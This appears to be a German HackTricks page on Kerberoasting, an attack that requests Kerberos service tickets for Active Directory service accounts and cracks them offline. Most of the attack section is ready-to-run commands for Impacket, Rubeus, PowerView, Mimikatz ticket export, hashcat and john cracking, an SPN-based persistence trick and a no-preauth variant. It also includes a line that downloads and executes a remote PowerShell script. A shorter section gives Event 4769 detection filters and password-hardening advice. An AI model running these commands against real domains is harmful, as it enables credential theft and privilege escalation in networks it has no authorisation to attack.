# Kerberoast

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterstützt werden.\
Zugang heute erhalten:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting konzentriert sich auf den Erwerb von **TGS-Tickets**, insbesondere solchen, die mit Diensten verbunden sind, die unter **Benutzerkonten** in **Active Directory (AD)** betrieben werden, ausgenommen **Computer-Konten**. Die Verschlüsselung dieser Tickets verwendet Schlüssel, die von **Benutzerpasswörtern** stammen, was die Möglichkeit des **Offline-Credential-Crackings** ermöglicht. Die Verwendung eines Benutzerkontos als Dienst wird durch eine nicht leere **"ServicePrincipalName"**-Eigenschaft angezeigt.

Für die Durchführung von **Kerberoasting** ist ein Domänenkonto erforderlich, das in der Lage ist, **TGS-Tickets** anzufordern; dieser Prozess erfordert jedoch keine **besonderen Berechtigungen**, was ihn für jeden mit **gültigen Domänenanmeldeinformationen** zugänglich macht.

### Wichtige Punkte:

- **Kerberoasting** zielt auf **TGS-Tickets** für **Benutzerkonto-Dienste** innerhalb von **AD** ab.
- Tickets, die mit Schlüsseln aus **Benutzerpasswörtern** verschlüsselt sind, können **offline geknackt** werden.
- Ein Dienst wird durch einen **ServicePrincipalName** identifiziert, der nicht null ist.
- **Keine besonderen Berechtigungen** sind erforderlich, nur **gültige Domänenanmeldeinformationen**.

### **Angriff**

> [!WARNING]
> **Kerberoasting-Tools** fordern typischerweise **`RC4-Verschlüsselung`** an, wenn sie den Angriff durchführen und TGS-REQ-Anfragen initiieren. Dies liegt daran, dass **RC4** [**schwächer**](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) und einfacher offline mit Tools wie Hashcat zu knacken ist als andere Verschlüsselungsalgorithmen wie AES-128 und AES-256.\
> RC4 (Typ 23) Hashes beginnen mit **`$krb5tgs$23$*`**, während AES-256 (Typ 18) mit **`$krb5tgs$18$*`** beginnt.`

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
Multi-Feature-Tools einschließlich eines Dumps von kerberoastbaren Benutzern:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

- **Kerberoastable Benutzer auflisten**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
- **Technik 1: Fordern Sie TGS an und dumpen Sie es aus dem Speicher**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
- **Technik 2: Automatische Werkzeuge**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
> [!WARNING]
> Wenn ein TGS angefordert wird, wird das Windows-Ereignis `4769 - Ein Kerberos-Dienstticket wurde angefordert` generiert.

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast), um einfach **Workflows** zu erstellen und **zu automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterstützt werden.\
Zugang heute erhalten:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}

### Knacken
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Persistenz

Wenn Sie **genug Berechtigungen** über einen Benutzer haben, können Sie ihn **kerberoastable** machen:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
Sie finden nützliche **Tools** für **Kerberoast**-Angriffe hier: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Wenn Sie diesen **Fehler** von Linux finden: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`**, liegt das an Ihrer lokalen Zeit, Sie müssen den Host mit dem DC synchronisieren. Es gibt einige Optionen:

- `ntpdate <IP des DC>` - Ab Ubuntu 16.04 veraltet
- `rdate -n <IP des DC>`

### Minderung

Kerberoasting kann mit einem hohen Maß an Heimlichkeit durchgeführt werden, wenn es ausnutzbar ist. Um diese Aktivität zu erkennen, sollte auf **Security Event ID 4769** geachtet werden, die anzeigt, dass ein Kerberos-Ticket angefordert wurde. Aufgrund der hohen Frequenz dieses Ereignisses müssen jedoch spezifische Filter angewendet werden, um verdächtige Aktivitäten zu isolieren:

- Der Dienstname sollte nicht **krbtgt** sein, da dies eine normale Anfrage ist.
- Dienstnamen, die mit **$** enden, sollten ausgeschlossen werden, um Maschinenkonten, die für Dienste verwendet werden, nicht einzuschließen.
- Anfragen von Maschinen sollten herausgefiltert werden, indem Kontonamen im Format **machine@domain** ausgeschlossen werden.
- Nur erfolgreiche Ticketanfragen sollten berücksichtigt werden, identifiziert durch einen Fehlercode von **'0x0'**.
- **Am wichtigsten** ist, dass der Ticketverschlüsselungstyp **0x17** sein sollte, der häufig bei Kerberoasting-Angriffen verwendet wird.
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
Um das Risiko von Kerberoasting zu mindern:

- Stellen Sie sicher, dass **Passwörter für Dienstkonten schwer zu erraten sind**, wobei eine Länge von mehr als **25 Zeichen** empfohlen wird.
- Nutzen Sie **Managed Service Accounts**, die Vorteile wie **automatische Passwortänderungen** und **delegierte Verwaltung von Service Principal Names (SPN)** bieten, um die Sicherheit gegen solche Angriffe zu erhöhen.

Durch die Implementierung dieser Maßnahmen können Organisationen das Risiko, das mit Kerberoasting verbunden ist, erheblich reduzieren.

## Kerberoast ohne Domänenkonto

Im **September 2022** wurde eine neue Möglichkeit zur Ausnutzung eines Systems von einem Forscher namens Charlie Clark bekannt gemacht, die über seine Plattform [exploit.ph](https://exploit.ph/) geteilt wurde. Diese Methode ermöglicht den Erwerb von **Service Tickets (ST)** über eine **KRB_AS_REQ**-Anfrage, die bemerkenswerterweise keine Kontrolle über ein Active Directory-Konto erfordert. Im Wesentlichen, wenn ein Principal so eingerichtet ist, dass er keine Vorab-Authentifizierung benötigt – ein Szenario, das in der Cybersicherheitswelt als **AS-REP Roasting-Angriff** bekannt ist – kann dieses Merkmal genutzt werden, um den Anfrageprozess zu manipulieren. Insbesondere wird das System durch die Änderung des **sname**-Attributs im Anfragekörper getäuscht, sodass es ein **ST** anstelle des standardmäßigen verschlüsselten Ticket Granting Ticket (TGT) ausstellt.

Die Technik wird in diesem Artikel ausführlich erklärt: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

> [!WARNING]
> Sie müssen eine Liste von Benutzern bereitstellen, da wir kein gültiges Konto haben, um das LDAP mit dieser Technik abzufragen.

#### Linux

- [impacket/GetUserSPNs.py von PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

- [GhostPack/Rubeus von PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## Referenzen

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast), um einfach **Workflows** zu erstellen und **zu automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterstützt werden.\
Zugang heute erhalten:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
